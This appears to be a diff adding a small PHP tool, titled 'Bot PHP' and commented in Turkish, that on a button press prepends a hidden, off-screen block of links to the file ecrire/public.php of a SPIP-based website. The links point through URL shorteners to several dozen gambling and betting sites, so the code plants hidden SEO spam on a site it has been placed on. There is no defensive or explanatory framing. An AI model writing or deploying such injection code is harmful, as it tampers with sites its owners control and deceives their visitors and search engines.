@@ -1,0 +1,80 @@
+<?php
+
+// Backlink ekleme işlemi
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Eklenecek backlink kodu
+    $backlinkCode = '<span style="position: absolute; left: -9655px;">
+<a href="https://t2m.io/Z2LXUUqK">asyabahis.org</a>
+<a href="https://urlr.me/gbGwL">www.dumanbet.live</a>
+<a href="https://bit.ly/45L2Sre">www.pinbahiscasino.com</a>
+<a href="https://shorturl.at/EJ6Kx">sekabet.net</a>
+<a href="https://shorturl.at/LodCo">olabahisgir.com</a>
+<a href="http://gg.gg/maltcasino-net">www.maltcasino.net</a>
+<a href="https://cutt.ly/IesVdlBy">www.faffbet-giris.com</a>
+<a href="https://t2m.io/agETmLqx">www.asyabahisgo1.com</a>
+<a href="https://0rz.tw/6kdbb">dumanbetyenigiris.com</a>
+<a href="https://b.link/pinbahisgo.com">pinbahisgo1.com</a>
+<a href="https://bit.ly/sekabet-giris2">www.sekabet-giris2.com</a>
+<a href="https://0rz.tw/Ys25P">olabahisgo.com</a>
+<a href="https://rebrand.ly/maltcasino-giris">www.maltcasino-giris.com</a>
+<a href="https://0rz.tw/BXjsL">www.faffbet.net</a>
+<a href="https://cutt.ly/jwJi1RmN">betforward1.org</a>
+<a href="http://tinyurl.com/betforward-mobi">betforward.mobi</a>
+<a href="http://tinyurl.com/1xbet-adres">www.1xbet-adres.com</a>
+<a href="https://bit.ly/3Sza0BS">1xbet4iran.com</a>
+<a href="https://is.gd/zX9eVY">www.romabet1.com</a>
+<a href="https://tinyurl.com/yasbet1-net">www.yasbet2.net</a>
+<a href="https://tinyurl.com/1xirani">1xirani.com</a>
+<a href="https://cutt.ly/GetRGzw4">romabet.top</a>
+<a href="https://b.link/3btforward1.com">3btforward1.com</a>
+<a href="https://is.gd/iXJ8EK">1xbet</a>
+<a href="https://n9.cl/1xbet-farsi4-com">1xbet-farsi4.com</a>
+<a href="https://rebrand.ly/1xbet-farsi4-com">بهترین سایت شرط بندی</a>
+<a href="http://tinylink.in/l388t">betforward</a>
+
+
+</span>' . PHP_EOL;
+
+    // Ecrire klasörünün yolu
+    $ecrireDir = __DIR__ . DIRECTORY_SEPARATOR . 'ecrire';
+
+    // public.php dosyasının yolu
+    $publicFilePath = $ecrireDir . DIRECTORY_SEPARATOR . 'public.php';
+
+    // public.php dosyasını kontrol ve düzenleme işlemi
+    if (file_exists($publicFilePath)) {
+        // Dosya içeriğini oku
+        $fileContents = file_get_contents($publicFilePath);
+
+        // Backlink zaten var mı kontrol et
+        if (strpos($fileContents, $backlinkCode) === false) {
+            // Backlinki dosyanın en üstüne ekle
+            $newContents = $backlinkCode . $fileContents;
+
+            // Dosyayı yeni içerikle yaz
+            if (file_put_contents($publicFilePath, $newContents)) {
+                echo "Backlink başarıyla eklendi: $publicFilePath\n";
+            } else {
+                echo "Dosyaya yazma hatası: $publicFilePath\n";
+            }
+        } else {
+            echo "Backlink zaten mevcut: $publicFilePath\n";
+        }
+    } else {
+        echo "public.php dosyası bulunamadı: $publicFilePath\n";
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Bot PHP</title>
+</head>
+<body>
+    <form method="post">
+        <button type="submit">EKLE</button>
+    </form>
+</body>
+</html>
